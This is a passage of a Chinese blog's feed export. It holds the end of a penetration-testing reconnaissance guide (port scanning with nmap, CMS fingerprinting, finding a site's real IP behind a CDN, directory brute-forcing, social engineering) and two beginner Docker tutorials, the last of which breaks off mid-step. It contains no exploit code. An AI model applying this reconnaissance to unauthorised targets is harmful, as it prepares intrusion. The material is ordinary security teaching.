href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><img src="https://img-blog.csdnimg.cn/20210118233012206.png"><br><img src="https://img-blog.csdnimg.cn/20210118233028110.png"></p><p>2、子域名爆破：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br><img src="https://img-blog.csdnimg.cn/20210118232754511.png"><br>使用非常方便，而且速度 “很快啊”。</p><h4 id="四、端口探测："><a href="#四、端口探测：" class="headerlink" title="四、端口探测："></a>四、端口探测：</h4><p>在渗透测试中，哪些端口是开放的，对于渗透测试员尤为重要。通过扫描服务器开放的端口可以获得该服务器上存在的服务，从而可以对其进行精准打击。</p><h5 id="1、Nmap："><a href="#1、Nmap：" class="headerlink" title="1、Nmap："></a>1、Nmap：</h5><p>说起端口扫描，那就不得不说Nmap这款工具，Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具。强烈推荐！<br><img src="https://img-blog.csdnimg.cn/2021011900255693.png"><br><strong>基本使用</strong>：</p><p>最简单的使用就是：<code>nmap  域名/ip</code> 就可以扫描出端口的开放信息：<br><img src="https://img-blog.csdnimg.cn/20210119003431914.png"><br>可以看到服务器 80、443等端口是开放的。 </p><p>还可以使用命令：<code>nmap -p 端口 IP(域名)</code>，判断ip是否开放指定端口：<br><img src="https://img-blog.csdnimg.cn/20210119004003597.png"><br>可以看到 B站 80端口是开放的，8080是关闭的。更多nmap骚操作请看这篇文章：<a href="https://crayon-xin.github.io/2018/08/12/nmap%E8%B6%85%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">传送门</a></p><h5 id="2、Masscan扫描工具："><a href="#2、Masscan扫描工具：" class="headerlink" title="2、Masscan扫描工具："></a>2、Masscan扫描工具：</h5><p>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。而且，masscan更加灵活，它允许自定义任意的地址范和端口范围。<br>由于使用工具通常会在目标网站留下痕迹，接下来提供一种在线网站探测方法。</p><h5 id="3、在线网站："><a href="#3、在线网站：" class="headerlink" title="3、在线网站："></a>3、在线网站：</h5><p>因为使用工具通常会在目标网站留下痕迹，因此推荐几个在线的端口扫描网站：</p><p>站长工具（老熟人了）：<a href="http://tool.chinaz.com/port/">http://tool.chinaz.com/port/</a></p><p><img src="https://img-blog.csdnimg.cn/20210119005455162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p>ThreatScan在线网站：<a href="https://scan.top15.cn/web/portscan">https://scan.top15.cn/web/portscan</a><br><img src="https://img-blog.csdnimg.cn/202101190055127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>🆗，知道了这些，端口的信息收集是不成问题了，但作为一个测试人员只知道如何扫描是不够的，还应知道开放端口所对应的服务，下面简单列举下：</p><h5 id="常见的端口及其说明："><a href="#常见的端口及其说明：" class="headerlink" title="常见的端口及其说明："></a>常见的端口及其说明：</h5><p>远程连接服务端口：<br><img src="https://img-blog.csdnimg.cn/20210119010007347.png"><br>文件共享服务端口：<br><img src="https://img-blog.csdnimg.cn/20210119010036153.png"><br>Web应用服务端口：<br><img src="https://img-blog.csdnimg.cn/20210119010233230.png"><br>邮件服务端口：<br><img src="https://img-blog.csdnimg.cn/20210119010430932.png"><br>网络常见协议端口：<br><img src="https://img-blog.csdnimg.cn/20210119010449262.png"><br>特殊服务端口：<br><img src="https://img-blog.csdnimg.cn/20210119010515511.png"></p><h4 id="五、CMS指纹识别："><a href="#五、CMS指纹识别：" class="headerlink" title="五、CMS指纹识别："></a>五、CMS指纹识别：</h4><p>CMS（Content Management System）又称为整站系统或文章系统，用于网站内容管理。用户只需要下载对应的CMS软件包，完成部署搭建，就能直接利用CMS。</p><p>因为各类CMS都有其独特的结构命名规则和特定的文件内容，因此可以利用这些内容来判断一个CMS类型信息，这就叫CMS指纹识别。</p><p>在渗透测试中，对目标站点进行指纹识别是很有必要的，如果识别出目标站点对应的CMS，则可以查找与该CMS相关的漏洞，方便对目标的进一步的渗透。</p><p>常见的CMS有：</p><ul><li><p>门户：dedecms(织梦)、phpcms、帝国cms</p></li><li><p>博客：WordPress、zblog、emlog</p></li><li><p>社区：Discuz、PHPWind</p></li><li><p>商城：shopex、ECShop</p></li></ul><p>下面介绍几款经典的识别工具。</p><h5 id="1、在线网站："><a href="#1、在线网站：" class="headerlink" title="1、在线网站："></a>1、在线网站：</h5><p>1、在线cms指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br><img src="https://img-blog.csdnimg.cn/20210119160343569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>2、云悉指纹识别：<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a><br><img src="https://img-blog.csdnimg.cn/20210119161345925.png"></p><h5 id="2、指纹识别工具："><a href="#2、指纹识别工具：" class="headerlink" title="2、指纹识别工具："></a>2、指纹识别工具：</h5><p>常用的本地工具有：御剑Web指纹识别、大禹CMS识别程序等。下面简单演示下御剑这款工具使用：</p><p><a href="https://pan.baidu.com/share/link?shareid=437376&uk=3526832374">下载链接</a>：<br><img src="https://img-blog.csdnimg.cn/20210119170241807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>右键添加域名/IP。</p><p><img src="https://img-blog.csdnimg.cn/20210119170343208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>可以看到成功解析到了域名，这款工具速度还可以，而且支持自定义关键字和正则匹配两种模式、使用起来还可以。缺点就是目前指纹的配置库偏少。</p><h5 id="3、CMS漏洞查询："><a href="#3、CMS漏洞查询：" class="headerlink" title="3、CMS漏洞查询："></a>3、CMS漏洞查询：</h5><p>对于查询到的CMS，可以在漏洞库网站查询对应的漏洞，进行进一步的渗透。推荐两个好用的漏洞库：</p><p>1、乌云漏洞库：<a href="https://wooyun.x10sec.org/">https://wooyun.x10sec.org/</a><br><img src="https://img-blog.csdnimg.cn/20210119162818445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>例：对织梦CMS进行漏洞查询：<br><img src="https://img-blog.csdnimg.cn/20210119162721266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>2、安全客漏洞库：<a href="https://www.anquanke.com/vul">https://www.anquanke.com/vul</a><br><img src="https://img-blog.csdnimg.cn/20210119171605103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h4 id="六、查找真实IP："><a href="#六、查找真实IP：" class="headerlink" title="六、查找真实IP："></a>六、查找真实IP：</h4><p>说到查找真实IP，需要先知道什么是CDN？</p><h5 id="1、什么是CDN："><a href="#1、什么是CDN：" class="headerlink" title="1、什么是CDN："></a>1、什么是CDN：</h5><p>CDN全称 Content Delivery Network，即内容分发网络。指一种通过互联网连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p><p>因此，如果目标服务器使用了CDN服务，那么我们直接查询到的IP并不是真正的目标服务器的IP，而是一台离你最近的目标节点的CDN服务器，这就导致了我们没法直接得到目标服务器的真实IP。</p><h5 id="2、如何判断目标服务器使用了CDN："><a href="#2、如何判断目标服务器使用了CDN：" class="headerlink" title="2、如何判断目标服务器使用了CDN："></a>2、如何判断目标服务器使用了CDN：</h5><p>我们可以直接ping目标域名，通过返回的域名可以判断是否为真实ip，我们来ping百度官网看一下：<br><img src="https://img-blog.csdnimg.cn/20210119215637165.png"><br>可以看到，ping的解析域名发生了改变，不再是 “<a href="http://www.baidu.com”了,出现这种就代表大概率使用了cdn.这时直接访问/">www.baidu.com”了，出现这种就代表大概率使用了CDN。这时直接访问</a> ping出来的域名或ip是无服务的，因为这台服务器只是做了数据转接，并没有web服务。</p><p>我们再来ping一下域名：“baidu.com”<br><img src="https://img-blog.csdnimg.cn/20210119220923222.png"><br>可以看到，这次的解析域名没有改变，这时访问 ip：39.156.66.14，发现也可以直接访问的到，出现这种情况说明 baidu.com域名可能并没有使用CDN，ip 39.156.66.14就有可能是真实ip。<br><img src="https://img-blog.csdnimg.cn/20210119223713606.png"></p><p>还可以使用在线网站进行检测，这里推荐一些很好用的网站：</p><p>1、全球Ping测试：<a href="https://www.wepcc.com/">https://www.wepcc.com</a><br><img src="https://img-blog.csdnimg.cn/20210119231936669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>2、17CE：<a href="https://www.17ce.com/">https://www.17ce.com</a><br><img src="https://img-blog.csdnimg.cn/20210119231852844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210119232406528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210119232151632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p>3、站长之家ping检测（没错又是它）：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><img src="https://img-blog.csdnimg.cn/20210119231956332.png"><br><img src="https://img-blog.csdnimg.cn/20210119232026504.png"></p><h5 id="3、如何寻找真实IP："><a href="#3、如何寻找真实IP：" class="headerlink" title="3、如何寻找真实IP："></a>3、如何寻找真实IP：</h5><p><strong>1、子域名查找法</strong>：</p><p>因为CDN和反向代理是需要成本的，有的网站只比较常用的域名使用cdn或反向代理，所以可以通过通过查找子域名来查找网站的真实IP。</p><p><strong>2、 查询主域</strong>:</p><p>很多网站只对 www域名使用了cdn，秃域名不使用，为的是在维护网站时更方便，不用等cdn缓存。所以可以试着把目标网站的www去掉，ping一下看ip是不是变了，这个上面的百度 baidu.com就是这样的。<br><img src="https://img-blog.csdnimg.cn/20210119220923222.png"></p><p><strong>3、查看域名历史解析</strong>：</p><p>可能目标之前没有使用CDN，所以可能会存在使用 CDN 前的记录。通过平台以前收集到的ip与域名绑定历史记录进行查询。 </p><p><strong>4、通过邮件服务器</strong>：</p><p>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己内部的邮件服务器，第三方或者公共邮件服务器是没有用的)。</p><p><strong>5、从国外访问</strong>：</p><p>国内的CDN往往只对国内用户的访问加速，而对国外的访问就不一定了。此时我们使用国外的主机直接访问可能就能获取到真实P。</p><h4 id="七、敏感目录-文件收集："><a href="#七、敏感目录-文件收集：" class="headerlink" title="七、敏感目录/文件收集："></a>七、敏感目录/文件收集：</h4><p>在渗透测试中，探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的后台管理、文件上传等重要页面，甚至可能扫描出网站的源代码。</p><p>目录扫描工具有非常多种，如：御剑后台扫描工具、wwwscan命令行工具、dirb命令工具、dirbuster扫描工具；其原理大致相同，都是对网站进行暴力枚举扫描，下面介绍下个人觉得非常好用的工具：</p><h5 id="1、dirsearch："><a href="#1、dirsearch：" class="headerlink" title="1、dirsearch："></a>1、dirsearch：</h5><p>dirsearch是一个功能强大，且非常经典的工具，基于python开发，旨在暴力扫描页面结构，包括网页中的目录和文件。<a href="https://github.com/maurosoria/dirsearch">下载链接</a></p><p>使用方法：<code>-u url -e 开发语言</code>（可以不指定语言，即 *）<br><img src="https://img-blog.csdnimg.cn/20210118125755426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h5 id="2、御剑后台扫描："><a href="#2、御剑后台扫描：" class="headerlink" title="2、御剑后台扫描："></a>2、御剑后台扫描：</h5><p> 这款工具是一款可视化的程序，支持用户自定义的字典，用起来比较方便。<br><img src="https://img-blog.csdnimg.cn/20210118130607176.png"></p><h4 id="八、社会工程学："><a href="#八、社会工程学：" class="headerlink" title="八、社会工程学："></a>八、社会工程学：</h4><p><img src="https://img-blog.csdnimg.cn/20210118173352256.jpg"><br>信息收集的最高境界大概就是社会工程学了，社会工程学（Social Engineering）是一种通过人际交流的方式获得信息的非技术渗透手段。社会工程学在渗透测试中起着不小的作用，利用社会工程学，攻击者可以从一名员工的口中挖掘出本应该是秘密的信息。</p><p>社会工程学协助渗透测试的例子数不胜数，渗透某个网站遇到困难时，给网站的呼叫人员打电话，往往能解决很多问题。此外，许多服务器的登录密码与该服务器的管理者有关，密码总是有个人痕迹，因此利用社会工程学获得服务器管理者的信息后，进行服务器渗透测试要简单得多。</p><h4 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h4><p>俗话说“渗透的本质也就是信息收集”，信息收集的深度，直接关系到渗透测试的成败。在信息收集阶段应尽可能多的获取目标站点的各种信息，可大大提高渗透测试的成功率。🆗，关于信息收集的总结到这里就结束了，以后发现新的好用的东西会接着补充，如果本文有哪些不对的地方，欢迎各位大佬补充更正🤞<font  color=red>❤</font>。</p><hr><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/215182.html">https://www.freebuf.com/articles/web/215182.html</a><br><a href="https://cloud.tencent.com/developer/article/1685126">https://cloud.tencent.com/developer/article/1685126</a><br><a href="https://www.anquanke.com/post/id/84865">https://www.anquanke.com/post/id/84865</a><br><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12489218.html">https://www.cnblogs.com/H4ck3R-XiX/p/12489218.html</a><br><a href="https://www.freebuf.com/articles/web/215182.html">https://www.freebuf.com/articles/web/215182.html</a><br><a href="https://blog.csdn.net/weixin_42320142/article/details/102679143">https://blog.csdn.net/weixin_42320142/article/details/102679143</a><br><a href="https://www.anquanke.com/post/id/163348">https://www.anquanke.com/post/id/163348</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker练习(一)——搭建web服务</title>
      <link href="2021/08/15/Docker%20%E7%BB%83%E4%B9%A0(%E4%B8%80)%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1/"/>
      <url>2021/08/15/Docker%20%E7%BB%83%E4%B9%A0(%E4%B8%80)%E2%80%94%E2%80%94%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="一、Docker-安装-Nginx："><a href="#一、Docker-安装-Nginx：" class="headerlink" title="一、Docker 安装 Nginx："></a>一、Docker 安装 Nginx：</h4><h5 id="1、搜索镜像-search"><a href="#1、搜索镜像-search" class="headerlink" title="1、搜索镜像 search"></a>1、搜索镜像 search</h5><pre><code class="shell">docker search nginx</code></pre><p><img src="http://img-blog.csdnimg.cn/b63cdef302f3418cbc20c342b4c92ef8.png" alt="在这里插入图片描述"></p><h5 id="2、拉取镜像-pull"><a href="#2、拉取镜像-pull" class="headerlink" title="2、拉取镜像 pull"></a>2、拉取镜像 pull</h5><pre><code class="shell">docker pull nginx</code></pre><p>这里直接拉的最新版的。<br><img src="http://img-blog.csdnimg.cn/9b73d87c2afa4c2e80d79a2a33551894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>镜像拉取成功<br><img src="http://img-blog.csdnimg.cn/ae5b2cd452ad445f8f67bf3dfc47e568.png" alt="在这里插入图片描述"></p><h5 id="3、创建容器并运行"><a href="#3、创建容器并运行" class="headerlink" title="3、创建容器并运行"></a>3、创建容器并运行</h5><pre><code class="shell">docker run -d --name nginx01 -p 3344:80 nginx# -d 后台运行# --name 给容器命名# -p 宿主机端口:容器内部端口</code></pre><p><img src="http://img-blog.csdnimg.cn/01ae28d21801482e952ca135fbb715bc.png" alt="在这里插入图片描述"><br>端口映射示意图：<br><img src="http://img-blog.csdnimg.cn/3d444537707244ebb46b133df61e07bc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="4、测试访问："><a href="#4、测试访问：" class="headerlink" title="4、测试访问："></a>4、测试访问：</h5><p>本地访问成功<br><img src="http://img-blog.csdnimg.cn/59efabd381df4759b3d65e2612b71d71.png" alt="在这里插入图片描述"><br>外部网络访问成功<br><img src="http://img-blog.csdnimg.cn/a2154500bca84012b246bb736ffd2056.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不得不说，docker 真的太方便了！</p><p>停止容器后自然就无法访问了：<br><img src="http://img-blog.csdnimg.cn/3e16fb0f6ac142399115700129067731.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/c830401b9f4245dcbe88042b4a9da530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="二、Docker-安装-tomcat"><a href="#二、Docker-安装-tomcat" class="headerlink" title="二、Docker 安装 tomcat"></a>二、Docker 安装 tomcat</h4><p>官方的使用：<br><img src="http://img-blog.csdnimg.cn/f685cc31c5294d76ac2140c9d7c980fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 之前的启动都是后台，停止了容器之后，容器还是可以查到</p><pre><code class="shell"> docker run -it --rm image #一般是用来测试，用完就删除（不推荐） --rm #运行结束自动删除 </code></pre><h5 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载:"></a>1、下载:</h5><pre><code class="powershell">docker pull tomcat:9.0</code></pre><p><img src="https://img-blog.csdnimg.cn/70c781930d464efb8a2855b5948148a2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2、启动运行"><a href="#2、启动运行" class="headerlink" title="2、启动运行:"></a>2、启动运行:</h5><pre><code class="shell">docker run -d -p 3355:8080 --name tomcat01 tomcat:9.0</code></pre><h5 id="3、测试访问："><a href="#3、测试访问：" class="headerlink" title="3、测试访问："></a>3、测试访问：</h5><p><img src="http://img-blog.csdnimg.cn/f71a19380db64716b55bc42284d73837.png" alt="在这里插入图片描述"><br>可以看到这种状态是部署成功的，只是 webapps 目录下是空的。</p><p><strong>进入容器</strong>：<br><img src="http://img-blog.csdnimg.cn/7d710d91eefd4438858ada1533c93b5f.png" alt="在这里插入图片描述"><br>原因：阿里云镜像是阉割版，它为保证最小镜像，将不必要的都剔除了，只保留了最小可运行环境！</p><h4 id="三、部署-Elasticsearch-es-kibana"><a href="#三、部署-Elasticsearch-es-kibana" class="headerlink" title="三、部署 Elasticsearch(es)+kibana"></a>三、部署 Elasticsearch(es)+kibana</h4><pre><code class="powershell"># es 暴露的端口很多！# es 十分耗内存# es 的数据一般需要放置到安全目录！挂载</code></pre><h5 id="1、下载启动-Elasticsearch-（Docker一步搞定）"><a href="#1、下载启动-Elasticsearch-（Docker一步搞定）" class="headerlink" title="1、下载启动 Elasticsearch:（Docker一步搞定）"></a>1、下载启动 Elasticsearch:（Docker一步搞定）</h5><p>官方使用：<br><img src="http://img-blog.csdnimg.cn/c02593da745e4f3eaacb04ffdc7a1d72.png" alt="在这里插入图片描述"></p><pre><code class="powershell">--net somenetwork #网络配置，先不管</code></pre><pre><code class="shell">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:7.13.4</code></pre><p><img src="http://img-blog.csdnimg.cn/54ce698e72bf478695535f7474275f05.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2、测试es是否成功启动"><a href="#2、测试es是否成功启动" class="headerlink" title="2、测试es是否成功启动"></a>2、测试es是否成功启动</h5><p><img src="http://img-blog.csdnimg.cn/9c6c04bc45094708b09b989799c5c4ea.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功部署。</p><p>查看一下 docker 容器的内存情况（每秒刷新，也挺耗内存的一个命令）</p><pre><code class="shell"> docker stats</code></pre><p><img src="http://img-blog.csdnimg.cn/2b1f2dd86d454a90ae702467d4445a15.png" alt="在这里插入图片描述"></p><h5 id="3、添加内存的限制："><a href="#3、添加内存的限制：" class="headerlink" title="3、添加内存的限制："></a>3、添加内存的限制：</h5><p>由于es消耗的内存过大，所以需要手动设置一下内存大小。</p><pre><code class="shell">docker run -d --name elasticsearch02 -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:7.13.4</code></pre><p><img src="http://img-blog.csdnimg.cn/1a1fce5fb5704644864030d9b2a36477.png" alt="在这里插入图片描述"><br>可以明显的看到限制效果。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器学习(一)</title>
      <link href="2021/08/15/Docker%E5%AE%B9%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2021/08/15/Docker%E5%AE%B9%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>废话就不说了，抓紧时间学习。docker yyds！</p><h4 id="一、Docker-概述："><a href="#一、Docker-概述：" class="headerlink" title="一、Docker 概述："></a>一、Docker 概述：</h4><h5 id="1、Docker-简介"><a href="#1、Docker-简介" class="headerlink" title="1、Docker 简介:"></a>1、Docker 简介:</h5><p><img src="http://img-blog.csdnimg.cn/4704ab1ac1ed42f8a7ddaf9d34c75642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="请添加图片描述"><br>Docker 是一个开源的应用容器引擎，可以将你的开发环境、代码、配置文件等一并打包到这个容器中，并发布和应用到任意平台。比如，你在本地用 Python 开发网站后台，开发测试完成后，就可以将 Python3 及其依赖包、Flask 及其各种插件、Mysql、Nginx 等打包到一个容器中，然后部署到任意你想部署到的环境。</p><p>Docker 的思想来自于集装箱，集装箱解决了什么问题？在一艘大船上，可以把货物规整的摆放起来。并且各种各样的货物被集装箱标准化了，集装箱和集装箱之间不会互相影响。那么就不需要专门运送水果的船和专门运送化学品的船了。</p><p>Docker基于Go语言开发的！开源项目！</p><h5 id="2、对比传统虚拟机："><a href="#2、对比传统虚拟机：" class="headerlink" title="2、对比传统虚拟机："></a>2、对比传统虚拟机：</h5><p>在容器技术出来之前，我们都是使用虚拟机技术，虚拟机相较于 docker 容器很笨重。</p><p><img src="http://img-blog.csdnimg.cn/c0f1ebae63ce43b0b98b1b94db7e11a5.png"></p><h4 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念:"></a>二、基本概念:</h4><p>Docker 包括三个基本概念：</p><ul><li><p>镜像(Image)</p></li><li><p>容器(Container)</p></li><li><p>仓库(Repository)</p></li></ul><p>理解了这三个概念，就理解了 Docker 的整个生命周期。</p><h5 id="1、镜像（image-："><a href="#1、镜像（image-：" class="headerlink" title="1、镜像（image)："></a>1、镜像（image)：</h5><p>类似于虚拟机中的镜像，是一个包含有文件系统的面向 docker 引擎的只读模板。任何应用程序运行都需要环境，而镜像就是用来提供这种运行环境的。例如一个 Ubuntu 镜像就是一个包含 Ubuntu 操作系统环境的模板。</p><h5 id="2、容器-container-："><a href="#2、容器-container-：" class="headerlink" title="2、容器(container)："></a>2、容器(container)：</h5><p>镜像和容器的关系，就像是面向对象程序设计中的 “类” 和 “实例” 一样，镜像是静态的定义，容器是镜像运行时的实体。可以将其看作一个简易的Linux系统 以及运行在其中的应用程序。Docker利用容器来运行、隔离各个应用。容器是镜像创建的应用实例，可以创建、启动、停止、删除容器，各个容器之间是是相互隔离的，互不影响。</p><h5 id="3、仓库-repository"><a href="#3、仓库-repository" class="headerlink" title="3、仓库(repository)"></a>3、仓库(repository)</h5><p>仓库就是用来集中存放镜像文件的地方。类似于代码仓库，这里是镜像仓库，分为公有仓库和私有仓库。注意与注册服务器（Registry）的区别：注册服务器是存放仓库的地方，一般会有多个仓库；而仓库是存放镜像的地方，一般每个仓库存放一类镜像，每个镜像利用 tag 进行区分，比如 Ubuntu 仓库存放有多个版本（12.04、14.04等）的 Ubuntu 镜像。</p><p>目前最用的 Registry 是官方的 <a href="http://hub.docker.com/">Docker Hub</a>，这也是默认的 Registry，拥有大量的高质量的官方镜像 。除此以外，还有 Red Hat 的 <a href="http://quay.io/repository/">Quay.io</a> ；Google 的 <a href="http://cloud.google.com/container-registry/">Google Container Registry</a>，<a href="http://kubernetes.io/">Kubernetes</a> (K8s) 的镜像使用的就是这个服务；以及代码托管平台 GitHub 推出的 <a href="http://docs.github.com/cn/packages/working-with-a-github-packages-registry/working-with-the-container-registry">ghcr.io</a>。</p><h4 id="三、Docker-安装"><a href="#三、Docker-安装" class="headerlink" title="三、Docker 安装"></a>三、Docker 安装</h4><p>Docker 可以安装在 Windows、Linux、Mac 等各个平台上。具体可以查看文档 <a href="http://docs.docker.com/engine/install/">Install Docker</a>。</p><p>环境准备： Linux要求内核3.0以上</p><p>查询内核版本命令：</p><pre><code class="shell"> uname -r</code></pre><p><img src="http://img-blog.csdnimg.cn/a515005f66604e20bf13232f1563d8d9.png"><br>这里使用的OS是Ubuntu，可以看到 版本是符合要求的。</p><p>准备好环境之后，接下来按着官方文档来一步一步安装。<br><img src="http://img-blog.csdnimg.cn/ade3c469999c430fa7bf073518208343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>这里使用官方推荐的第一种方法安装。<br><img src="http://img-blog.csdnimg.cn/15706d39f3ff4a0b98d3224ec789a5e2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><h5 id="第一步：卸载旧版本"><a href="#第一步：卸载旧版本" class="headerlink" title="第一步：卸载旧版本"></a>第一步：卸载旧版本</h5><pre><code class="shell"> sudo apt-get remove docker docker-engine docker.io containerd runc</code></pre><p>如果有的话就卸，没有则省略。</p><h5 id="第二步：更新apt包索引和安装包，以允许apt使用http存储库"><a href="#第二步：更新apt包索引和安装包，以允许apt使用http存储库" class="headerlink" title="第二步：更新apt包索引和安装包，以允许apt使用http存储库:"></a>第二步：更新apt包索引和安装包，以允许apt使用http存储库:</h5><pre><code class="shell"> 